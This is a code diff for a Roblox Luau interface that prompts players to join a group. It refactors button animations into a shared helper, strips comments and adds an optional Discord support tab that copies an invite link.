-		BackgroundColor3 = C.stroke, BackgroundTransparency = 0.4, BorderSizePixel = 0,
-	}, window)
+	divider(UDim2.new(0, 1, 1, -HEADER), UDim2.fromOffset(SIDEBAR, HEADER))
 end
 
 draggable(header, root, function() return W * fit / 2, H * fit / 2 end)
 
----------------- button ----------------
--- returns the clickable area and its label
-local function makeButton(parent, position, size, primary, caption, textSize)
+local function makeButton(parent, position, size, caption, textSize)
 	local hit = make("TextButton", {
 		Position = position, Size = size, BackgroundTransparency = 1, Text = "",
 		AutoButtonColor = false, BorderSizePixel = 0,
 	}, parent)
-	local fill = make("Frame", {
-		Size = UDim2.fromScale(1, 1), BorderSizePixel = 0,
-		BackgroundColor3 = primary and C.white or C.surface,
-	}, hit)
+	local fill = make("Frame", { Size = UDim2.fromScale(1, 1), BorderSizePixel = 0, BackgroundColor3 = C.surface }, hit)
 	round(fill, 12)
-	local edge = stroke(fill, primary and C.white or C.stroke, 1, primary and 0.8 or 0)
-	if primary then
-		make("UIGradient", { Color = ColorSequence.new(C.accent, C.accent2), Rotation = 20 }, fill)
-	end
+	local edge = stroke(fill, C.stroke, 1, 0)
 	local lbl = fitLabel({
 		Size = UDim2.new(1, -12, 1, 0), Position = UDim2.fromOffset(6, 0), Text = caption,
-		TextColor3 = primary and C.white or C.text, Font = Enum.Font.GothamBold, ZIndex = 2,
-	}, hit, textSize or 14)
-	local scale = make("UIScale", {}, hit)
-
-	bind(hit,
+		TextColor3 = C.text, Font = Enum.Font.GothamBold, ZIndex = 2,
+	}, hit, textSize)
+	pressable(hit, 1.03, 0.96,
 		function()
-			tween(scale, 0.12, { Scale = 1.03 })
-			if primary then tween(edge, 0.12, { Transparency = 0.5 })
-			else
-				tween(fill, 0.12, { BackgroundColor3 = C.surfaceHover })
-				tween(edge, 0.12, { Color = C.strokeHover })
-			end
+			tween(fill, 0.12, { BackgroundColor3 = C.surfaceHover })
+			tween(edge, 0.12, { Color = C.strokeHover })
 		end,
 		function()
-			tween(scale, 0.12, { Scale = 1 })
-			if primary then tween(edge, 0.12, { Transparency = 0.8 })
-			else
-				tween(fill, 0.12, { BackgroundColor3 = C.surface })
-				tween(edge, 0.12, { Color = C.stroke })
-			end
-		end,
-		function() tween(scale, 0.05, { Scale = 0.96 }) end,
-		function() tween(scale, 0.12, { Scale = 1.03 }) end)
+			tween(fill, 0.12, { BackgroundColor3 = C.surface })
+			tween(edge, 0.12, { Color = C.stroke })
+		end)
 	return hit, lbl
 end
 
----------------- tabs + pages ----------------
 local pages, current, pageToken = {}, nil, 0
 local tabs = {}
-local showPage -- defined below
+local showPage
 
-local TAB_W = COMPACT and math.floor((W - 24 - 8) / 2) or (SIDEBAR - 24)
+local TAB_COUNT = HAS_DISCORD and 3 or 2
+local TAB_W = COMPACT and math.floor((W - 24 - 8 * (TAB_COUNT - 1)) / TAB_COUNT) or (SIDEBAR - 24)
 local function makeTab(index, key)
 	local btn = make("TextButton", {
 		Size = COMPACT and UDim2.fromOffset(TAB_W, 32) or UDim2.fromOffset(TAB_W, 38),
@@ -1491,6 +1526,7 @@ local function makeTab(index, key)
 end
 makeTab(1, "join")
 makeTab(2, "lang")
+if HAS_DISCORD then makeTab(3, "support") end
 
 local function setTabActive(name)
 	for key, t in pairs(tabs) do
@@ -1511,7 +1547,7 @@ end
 
 showPage = function(name)
 	if name == current then return end
-	pageToken += 1
+	pageToken = pageToken + 1
 	local token = pageToken
 	local old, new = pages[current], pages[name]
 	current = name
@@ -1531,9 +1567,7 @@ showPage = function(name)
 	end)
 end
 
----------------- pop-up (toast) ----------------
--- bottom right on PC; top center on phones/tablets so it never covers the on-screen controls
-local closeForGood -- defined near the end (fades the window out after a successful check)
+local closeForGood
 local TOAST_HIDDEN = onTouch and UDim2.new(0.5, 0, 0, -100) or UDim2.new(1, 340, 1, -20)
 local TOAST_SHOWN = onTouch and UDim2.new(0.5, 0, 0, 14) or UDim2.new(1, -20, 1, -20)
 local toast = make("Frame", {
@@ -1559,11 +1593,11 @@ local toastClose = make("TextButton", {
 
 local toastId = 0
 local function hideToast()
-	toastId += 1
+	toastId = toastId + 1
 	tween(toast, 0.3, { Position = TOAST_HIDDEN })
 end
 local function showToast(key, color, ...)
-	toastId += 1
+	toastId = toastId + 1
 	local id = toastId
 	toastMsg.Text = tr(key, ...)
 	toastStroke.Color = color
@@ -1575,7 +1609,6 @@ local function showToast(key, color, ...)
 end
 toastClose.MouseButton1Click:Connect(hideToast)
 
----------------- page: join ----------------
 local joinPage = newPage("join")
 local joinTitle = fitLabel({
 	Size = UDim2.new(1, -48, 0, 30), Position = UDim2.fromOffset(24, 12), TextColor3 = C.text,
@@ -1586,7 +1619,6 @@ local joinSub = fitLabel({
 	TextXAlignment = Enum.TextXAlignment.Left,
 }, joinPage, 12)
 
--- the big button: one tap copies the group link
 local ctaHit = make("TextButton", {
 	Size = UDim2.new(1, -48, 0, 50), Position = UDim2.fromOffset(24, 78), BackgroundTransparency = 1,
 	Text = "", AutoButtonColor = false, BorderSizePixel = 0,
@@ -1595,7 +1627,6 @@ local ctaFill = make("Frame", { Size = UDim2.fromScale(1, 1), BackgroundColor3 =
 round(ctaFill, 13)
 make("UIGradient", { Color = ColorSequence.new(C.accent, C.accent2), Rotation = 20 }, ctaFill)
 local ctaStroke = stroke(ctaFill, C.white, 1, 0.8)
--- a soft light that glides across the button every few seconds so the eye goes to it
 local shimmer = make("Frame", { Size = UDim2.fromScale(1, 1), BackgroundColor3 = C.white, BorderSizePixel = 0, ZIndex = 2 }, ctaHit)
 round(shimmer, 13)
 local shimmerGrad = make("UIGradient", {
@@ -1611,26 +1642,22 @@ local ctaLabel = fitLabel({
 	Size = UDim2.new(1, -28, 1, 0), Position = UDim2.fromOffset(14, 0), TextColor3 = C.white,
 	Font = Enum.Font.GothamBold, ZIndex = 3,
 }, ctaHit, 16)
-local ctaScale = make("UIScale", {}, ctaHit)
-bind(ctaHit,
-	function() tween(ctaScale, 0.12, { Scale = 1.02 }) tween(ctaStroke, 0.12, { Transparency = 0.45 }) end,
-	function() tween(ctaScale, 0.12, { Scale = 1 }) tween(ctaStroke, 0.12, { Transparency = 0.8 }) end,
-	function() tween(ctaScale, 0.05, { Scale = 0.97 }) end,
-	function() tween(ctaScale, 0.12, { Scale = 1.02 }) end)
+pressable(ctaHit, 1.02, 0.97,
+	function() tween(ctaStroke, 0.12, { Transparency = 0.45 }) end,
+	function() tween(ctaStroke, 0.12, { Transparency = 0.8 }) end)
 
--- the button text can show feedback ("Link copied") for a moment, then goes back to normal
-local ctaKey, ctaArgs, ctaToken = "join_btn", table.pack(), 0
+local ctaKey, ctaArgs, ctaToken = "join_btn", { n = 0 }, 0
 local function renderCta()
-	ctaLabel.Text = tr(ctaKey, table.unpack(ctaArgs, 1, ctaArgs.n))
+	ctaLabel.Text = tr(ctaKey, unpack(ctaArgs, 1, ctaArgs.n))
 end
 local function flashCta(key, ...)
-	ctaKey, ctaArgs = key, table.pack(...)
-	ctaToken += 1
+	ctaKey, ctaArgs = key, { n = select("#", ...), ... }
+	ctaToken = ctaToken + 1
 	local id = ctaToken
 	renderCta()
 	task.delay(3.5, function()
 		if id == ctaToken then
-			ctaKey, ctaArgs = "join_btn", table.pack()
+			ctaKey, ctaArgs = "join_btn", { n = 0 }
 			renderCta()
 		end
 	end)
@@ -1646,7 +1673,6 @@ ctaHit.MouseButton1Click:Connect(function()
 	end
 end)
 
--- "Check Again" card: title, small hint underneath and an arrow on the right
 local checkHit = make("TextButton", {
 	Size = UDim2.new(1, -48, 0, 54), Position = UDim2.fromOffset(24, 138), BackgroundTransparency = 1,
 	Text = "", AutoButtonColor = false, BorderSizePixel = 0,
@@ -1666,29 +1692,17 @@ label({
 	Size = UDim2.fromOffset(30, 54), Position = UDim2.new(1, -38, 0, 0), Text = ">", TextColor3 = C.text,
 	Font = Enum.Font.GothamBold, TextSize = 18, ZIndex = 2,
 }, checkHit)
-local checkScale = make("UIScale", {}, checkHit)
-bind(checkHit,
-	function()
-		tween(checkScale, 0.12, { Scale = 1.02 })
-		tween(checkFill, 0.12, { BackgroundColor3 = C.surfaceHover })
-	end,
-	function()
-		tween(checkScale, 0.12, { Scale = 1 })
-		tween(checkFill, 0.12, { BackgroundColor3 = C.surface })
-	end,
-	function() tween(checkScale, 0.05, { Scale = 0.97 }) end,
-	function() tween(checkScale, 0.12, { Scale = 1.02 }) end)
+pressable(checkHit, 1.02, 0.97,
+	function() tween(checkFill, 0.12, { BackgroundColor3 = C.surfaceHover }) end,
+	function() tween(checkFill, 0.12, { BackgroundColor3 = C.surface }) end)
 
-local checkState = "idle" -- idle | busy | done
+local checkState = "idle"
 local function renderCheck()
-	if checkState == "busy" then
-		checkTitle.Text = tr("checking")
-		checkSub.Text = tr("check_sub")
-	elseif checkState == "done" then
+	if checkState == "done" then
 		checkTitle.Text = tr("verified")
 		checkSub.Text = tr("already")
 	else
-		checkTitle.Text = tr("check_title")
+		checkTitle.Text = tr(checkState == "busy" and "checking" or "check_title")
 		checkSub.Text = tr("check_sub")
 	end
 	checkTitle.TextColor3 = (checkState == "done") and C.success or C.text
@@ -1705,9 +1719,9 @@ checkHit.MouseButton1Click:Connect(function()
 			result = isInGroup()
 			finished = true
 		end)
-		while not finished and os.clock() - started < 10 do task.wait(0.1) end -- never stay stuck on "Checking..."
+		while not finished and os.clock() - started < 10 do task.wait(0.1) end
 		local inGroup = finished and result == true
-		local rest = 0.8 - (os.clock() - started) -- always show "Checking..." long enough to be seen
+		local rest = 0.8 - (os.clock() - started)
 		if rest > 0 then task.wait(rest) end
 		if inGroup then
 			checkState = "done"
@@ -1728,7 +1742,6 @@ checkHit.MouseButton1Click:Connect(function()
 	end)
 end)
 
--- the three steps
 local stepLabels = {}
 for i = 1, 3 do
 	local y = 204 + (i - 1) * 34
@@ -1748,8 +1761,51 @@ for i = 1, 3 do
 	}, joinPage, 13)
 end
 
----------------- page: language ----------------
-local setLanguage -- defined below
+local support = {}
+if HAS_DISCORD then
+	local BLURPLE = Color3.fromRGB(88, 101, 242)
+	local shownLink = (DISCORD_LINK:gsub("^https?://", ""):gsub("/+$", ""))
+	local supportPage = newPage("support")
+
+	support.title = fitLabel({
+		Size = UDim2.new(1, -48, 0, 30), Position = UDim2.fromOffset(24, 12), TextColor3 = C.text,
+		Font = Enum.Font.GothamBold, TextXAlignment = Enum.TextXAlignment.Left,
+	}, supportPage, 22)
+	support.sub = fitLabel({
+		Size = UDim2.new(1, -48, 0, 40), Position = UDim2.fromOffset(24, 46), TextColor3 = C.muted,
+		TextWrapped = true, TextXAlignment = Enum.TextXAlignment.Left, TextYAlignment = Enum.TextYAlignment.Top,
+	}, supportPage, 13)
+
+	local hit = make("TextButton", {
+		Size = UDim2.new(1, -48, 0, 50), Position = UDim2.fromOffset(24, 100), BackgroundTransparency = 1,
+		Text = "", AutoButtonColor = false, BorderSizePixel = 0,
+	}, supportPage)
+	local fill = make("Frame", { Size = UDim2.fromScale(1, 1), BackgroundColor3 = BLURPLE, BorderSizePixel = 0 }, hit)
+	round(fill, 13)
+	local edge = stroke(fill, C.white, 1, 0.8)
+	support.btn = fitLabel({
+		Size = UDim2.new(1, -28, 1, 0), Position = UDim2.fromOffset(14, 0), TextColor3 = C.white,
+		Font = Enum.Font.GothamBold, ZIndex = 2,
+	}, hit, 16)
+	pressable(hit, 1.02, 0.97,
+		function() tween(edge, 0.12, { Transparency = 0.45 }) end,
+		function() tween(edge, 0.12, { Transparency = 0.8 }) end)
+
+	label({
+		Size = UDim2.new(1, -48, 0, 18), Position = UDim2.fromOffset(24, 158), Text = shownLink,
+		TextColor3 = C.muted, TextSize = 12,
+	}, supportPage)
+
+	hit.MouseButton1Click:Connect(function()
+		if copy(DISCORD_LINK) then
+			showToast("link_copied", C.success)
+		else
+			showToast("discord_failed", C.danger, shownLink)
+		end
+	end)
+end
+
+local setLanguage
 local langPage = newPage("lang")
 local langTitle = fitLabel({
 	Size = UDim2.new(1, -48, 0, 30), Position = UDim2.fromOffset(24, 12), TextColor3 = C.text,
@@ -1760,28 +1816,31 @@ local langSub = fitLabel({
 	TextXAlignment = Enum.TextXAlignment.Left,
 }, langPage, 12)
 
--- scrollable list (touch-friendly): 3 buttons per row on wide windows, 2 on narrow phones
 local COLS, GAP, BTN_H, ROW = COMPACT and 2 or 3, 8, 38, 46
 local btnW = math.floor((PAGE_W - 48 - GAP * (COLS - 1)) / COLS)
-local rows = math.ceil(#LANGS / COLS)
 local list = make("ScrollingFrame", {
 	Size = UDim2.fromOffset(PAGE_W - 24, PAGE_H - 74), Position = UDim2.fromOffset(12, 72),
 	BackgroundTransparency = 1, BorderSizePixel = 0, ScrollBarThickness = 3, ScrollBarImageColor3 = C.strokeHover,
-	CanvasSize = UDim2.fromOffset(0, rows * ROW + 8), ScrollingDirection = Enum.ScrollingDirection.Y,
+	CanvasSize = UDim2.fromOffset(0, math.ceil(#LANGS / COLS) * ROW + 8), ScrollingDirection = Enum.ScrollingDirection.Y,
 }, langPage)
 local langLabels = {}
 for i, item in ipairs(LANGS) do
 	local col, row = (i - 1) % COLS, math.floor((i - 1) / COLS)
 	local hit, lbl = makeButton(list, UDim2.fromOffset(12 + col * (btnW + GAP), 4 + row * ROW),
-		UDim2.fromOffset(btnW, BTN_H), false, item[2], RTL[item[1]] and 17 or 13)
+		UDim2.fromOffset(btnW, BTN_H), item[2], RTL[item[1]] and 17 or 13)
 	langLabels[item[1]] = lbl
 	hit.MouseButton1Click:Connect(function() setLanguage(item[1]) end)
 end
 
----------------- language wiring ----------------
 local function applyLanguage()
 	tabs.join.lbl.Text = tr("tab_join")
 	tabs.lang.lbl.Text = tr("tab_lang")
+	if HAS_DISCORD then
+		tabs.support.lbl.Text = tr("tab_support")
+		support.title.Text = tr("tab_support")
+		support.sub.Text = tr("support_sub")
+		support.btn.Text = tr("discord_btn")
+	end
 	joinTitle.Text = tr("join_title")
 	joinSub.Text = tr("join_sub")
 	renderCta()
@@ -1790,7 +1849,7 @@ local function applyLanguage()
 	langTitle.Text = tr("tab_lang")
 	langSub.Text = tr("lang_sub")
 	for code, lbl in pairs(langLabels) do
-		lbl.TextColor3 = (code == lang) and C.accent2 or C.text -- the selected / detected language is highlighted
+		lbl.TextColor3 = (code == lang) and C.accent2 or C.text
 	end
 end
 
@@ -1800,52 +1859,42 @@ setLanguage = function(code)
 	showPage("join")
 end
 
--- soft blur behind the window while it is open
-local blur
-pcall(function()
-	blur = Instance.new("BlurEffect")
-	blur.Name = "LumenBlur"
-	blur.Size = 0
-	blur.Parent = Lighting
-end)
+local blur = Instance.new("BlurEffect")
+blur.Name = "LumenBlur"
+blur.Size = 0
+pcall(function() blur.Parent = Lighting end)
 local function setBlur(size, t)
-	if blur then tween(blur, t, { Size = size }) end
+	tween(blur, t, { Size = size })
 end
 
----------------- minimize bubble ----------------
 local BUBBLE = 52
 local bubble = make("TextButton", {
 	Size = UDim2.fromOffset(BUBBLE, BUBBLE), AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.new(0, 49, 0.5, 0),
 	BackgroundTransparency = 1, Text = "", AutoButtonColor = false, BorderSizePixel = 0, Visible = false,
 }, gui)
-for n = 1, 10 do -- very faint layers: a soft lift under the icon, never a dark box
-	local grow = n * 2
+for n = 1, 5 do
+	local grow = n * 4
 	local layer = make("Frame", {
 		AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.new(0.5, 0, 0.5, 3),
 		Size = UDim2.new(1, grow, 1, grow), BackgroundColor3 = Color3.new(0, 0, 0),
-		BackgroundTransparency = 0.99, BorderSizePixel = 0,
+		BackgroundTransparency = 0.98, BorderSizePixel = 0,
 	}, bubble)
 	round(layer, BUBBLE * 0.3 + grow / 2)
 end
 makeLogo(bubble, BUBBLE, UDim2.fromOffset(0, 0))
-local bubbleScale = make("UIScale", {}, bubble)
+local bubbleScale = pressable(bubble, 1.1, 1.1)
 local bubbleMoved = draggable(bubble, bubble, function() return BUBBLE / 2, BUBBLE / 2 end)
 
-bind(bubble,
-	function() tween(bubbleScale, 0.12, { Scale = 1.1 }) end,
-	function() tween(bubbleScale, 0.12, { Scale = 1 }) end)
-
 local isOpen, openToken = true, 0
-local rootHome = root.Position   -- where the window lives while open
-local SMALL = 0.12               -- scale the window shrinks to inside the bubble
+local rootHome = root.Position
+local SMALL = 0.12
 
 local function setOpen(open)
 	if open == isOpen then return end
 	isOpen = open
-	openToken += 1
+	openToken = openToken + 1
 	local token = openToken
 	if open then
-		-- bubble pops away, window grows out of it
 		tween(bubbleScale, 0.12, { Scale = 0 })
 		task.delay(0.12, function()
 			if isOpen and token == openToken then bubble.Visible = false end
@@ -1862,7 +1911,6 @@ local function setOpen(open)
 		setShadow(true, 0.3)
 		setBlur(10, 0.3)
 	else
-		-- window shrinks into the bubble, bubble pops in as it lands
 		rootHome = root.Position
 		tween(root, 0.28, { Position = bubble.Position })
 		tween(rootScale, 0.28, { Scale = fit * SMALL })
@@ -1890,16 +1938,14 @@ local function refit()
 	fit = computeFit()
 	if isOpen then tween(rootScale, 0.2, { Scale = fit }) end
 end
-gui:GetPropertyChangedSignal("AbsoluteSize"):Connect(refit)
+table.insert(conns, gui:GetPropertyChangedSignal("AbsoluteSize"):Connect(refit))
 
--- remove everything for good
 local function unload()
 	for _, c in ipairs(conns) do c:Disconnect() end
-	if blur then blur:Destroy() end
+	blur:Destroy()
 	gui:Destroy()
 end
 
--- after a successful check: leave the "verified" message up for a moment, fade the window out, clean up
 closeForGood = function()
 	task.wait(1.4)
 	if isOpen then
@@ -1908,19 +1954,17 @@ closeForGood = function()
 		tween(windowStroke, 0.3, { Transparency = 1 })
 		tween(rootScale, 0.3, { Scale = fit * 0.94 })
 	else
-		tween(bubbleScale, 0.25, { Scale = 0 }) -- it was minimized: the bubble goes away instead
+		tween(bubbleScale, 0.25, { Scale = 0 })
 	end
 	setBlur(0, 0.3)
-	task.wait(2.2) -- the pop-up stays on screen for its full time
+	task.wait(2.2)
 	unload()
 end
 
----------------- window buttons ----------------
 minBtn.MouseButton1Click:Connect(function() setOpen(false) end)
 
----------------- start ----------------
 applyLanguage()
-showPage("join") -- language is auto-detected; players can switch it from the Language tab
+showPage("join")
 
 tween(rootScale, 0.3, { Scale = fit })
 tween(window, 0.2, { GroupTransparency = 0 })
